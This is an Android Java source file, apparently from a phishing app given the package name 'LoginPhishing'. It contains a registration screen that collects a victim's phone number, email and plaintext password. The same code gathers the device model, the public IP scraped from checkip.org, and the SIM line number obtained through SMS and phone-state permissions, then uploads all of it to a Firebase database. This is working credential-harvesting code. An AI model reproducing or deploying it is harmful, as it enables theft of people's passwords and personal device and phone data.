package com.example.CZ.LoginPhishing;


import android.Manifest;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.AutoCompleteTextView;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseAuthException;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.FirebaseFirestore;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.IOException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;

import static android.Manifest.permission.READ_PHONE_NUMBERS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;

public class RegistrationActivity extends AppCompatActivity {

    private ImageView logo, joinus;
    private AutoCompleteTextView phoneno, email, password,name;
    private Button signup;
    private TextView signin;
    private ProgressDialog progressDialog;
    private FirebaseAuth firebaseAuth;
    private FirebaseDatabase firebaseDatabase;
    private FirebaseFirestore db = FirebaseFirestore.getInstance();
    private Map<String, Object> user = new HashMap<>();
    private String getIP;
    private String SIMInfo;
    private String path;

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_registration);

        try {

            initializeGUI();
        } catch (IOException e) {
            e.printStackTrace();
        }

        signup.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                final String inputName = phoneno.getText().toString().trim();
                final String inputPw = password.getText().toString().trim();
                final String inputEmail = email.getText().toString().trim();

                if (validateInput(inputName, inputPw, inputEmail)) {
                    try {
                        registerUser(inputName, inputPw, inputEmail);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

            }
        });


        signin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(RegistrationActivity.this, LoginActivity.class));
            }
        });

    }


    @RequiresApi(api = Build.VERSION_CODES.M)
    private void initializeGUI() throws IOException {

        logo = findViewById(R.id.ivRegLogo);
        joinus = findViewById(R.id.ivJoinUs);
        phoneno = findViewById(R.id.atvUsernameReg);
        name= findViewById(R.id.atvUserFirstName);
        email = findViewById(R.id.atvEmailReg);
        password = findViewById(R.id.atvPasswordReg);
        signin = findViewById(R.id.tvSignIn);
        signup = findViewById(R.id.btnSignUp);

        new getPublicIP().execute();
        getPhoneNumber();

        progressDialog = new ProgressDialog(this);

        firebaseAuth = FirebaseAuth.getInstance();
    }

    private void registerUser(final String inputName, final String inputPw, String inputEmail) throws IOException {
        progressDialog.setMessage("Verificating...");
        progressDialog.show();

            firebaseAuth.createUserWithEmailAndPassword(inputEmail,inputPw).addOnCompleteListener(new OnCompleteListener<AuthResult>() {
                @Override
                public void onComplete(@NonNull Task<AuthResult> task) {
                    if(task.isSuccessful()){
                        uploadDB();
                        progressDialog.dismiss();
                        //sendUserData(inputName, inputPw);
                        Toast.makeText(RegistrationActivity.this,"You've been registered successfully.",Toast.LENGTH_SHORT).show();
                        Intent i = new Intent(RegistrationActivity.this,MainActivity.class); // Your list's Intent
                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK); // Adds the FLAG_ACTIVITY_NO_HISTORY flag
                        startActivity(i);
                        //startActivity(new Intent(RegistrationActivity.this,MainActivity.class));
                    }
                    else{
                        progressDialog.dismiss();
                        Toast.makeText(RegistrationActivity.this,((FirebaseAuthException) task.getException()).getErrorCode(),Toast.LENGTH_LONG).show();
                        Log.e("Register Error", "onCancelled", task.getException());
                        //Toast.makeText(RegistrationActivity.this,"Email already exists.",Toast.LENGTH_SHORT).show();
                    }
                }
            });

    }

//    private void sendUserData(String phoneno, String password){
//
//        firebaseDatabase = FirebaseDatabase.getInstance();
//        DatabaseReference users = firebaseDatabase.getReference("users");
//        UserProfile user = new UserProfile(phoneno, password);
//        users.push().setValue(user);
//    }

    private boolean validateInput(String inName, String inPw, String inEmail){

        if(inName.isEmpty()){
            phoneno.setError("Phone No is empty.");
            return false;
        }
        if(inPw.isEmpty()){
            password.setError("Password is empty.");
            return false;
        }
        if(inEmail.isEmpty()){
            email.setError("Email is empty.");
            return false;
        }

        return true;
    }

    public String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }

    private void uploadDB(){
        // Create a new user with a email, username and password
        user.put("PhoneNo", phoneno.getText().toString());
        user.put("email", email.getText().toString());
        user.put("password", password.getText().toString());
        user.put("deviceName",getDeviceName());
        user.put("publicIP",getIP);
        user.put("SIM Info",SIMInfo);
        user.put("Name",name.getText().toString());

        path = "Android/"+firebaseAuth.getCurrentUser().getUid()+"/register/";
        DatabaseReference ref = FirebaseDatabase.getInstance().getReference(path);
        ref.setValue(user);
        // Add a new document with a generated ID
//        db.collection("register")
//                .add(user)
//                .addOnSuccessListener(new OnSuccessListener<DocumentReference>() {
//                    @Override
//                    public void onSuccess(DocumentReference documentReference) {
//                        Log.d("Success in FireStore", "DocumentSnapshot added with ID: " + documentReference.getId());
//                    }
//                })
//                .addOnFailureListener(new OnFailureListener() {
//                    @Override
//                    public void onFailure(@NonNull Exception e) {
//                        Log.w("Error in FireStore", "Error adding document", e);
//                    }
//                });

    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void getPhoneNumber(){



        if (ActivityCompat.checkSelfPermission(this, READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
            SIMInfo= Objects.requireNonNull(tMgr).getLine1Number();

        }
        else{

            requestPermission();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void requestPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(new String[]{READ_SMS, READ_PHONE_NUMBERS, READ_PHONE_STATE}, 100);

        }

    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case 100:
                TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) !=
                        PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
                        Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED  &&
                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    return;
                }
                SIMInfo =  tMgr.getLine1Number();

                if(SIMInfo.equals("")) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        List<SubscriptionInfo> subscription = SubscriptionManager.from(getApplicationContext()).getActiveSubscriptionInfoList();
                        for (int i = 0; i < subscription.size(); i++) {
                            SubscriptionInfo info = subscription.get(i);
                            SIMInfo=info.getCarrierName()+"  "+info.getNumber();
                            Log.d("getPhone", "number " + info.getNumber());
                            Log.d("getPhone", "network name : " + info.getCarrierName());
                        }
                    }
                }

                Log.e("Phone", String.valueOf(SIMInfo));
                break;
        }
    }

        private class getPublicIP extends AsyncTask<Void, Void, Void> {

            @Override
            protected void onPreExecute() {
                super.onPreExecute();
            }

            @Override
            protected Void doInBackground(Void... voids) {
                Document doc = null;
                try {
                    doc = Jsoup.connect("https://www.checkip.org").get();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                getIP= doc.getElementById("yourip").select("h1").first().select("span").text();
                return null;
            }

            @Override
            protected void onPostExecute(Void aVoid) {
                Log.e("PUBLIC IP",getIP);
                super.onPostExecute(aVoid);
            }
        }

}
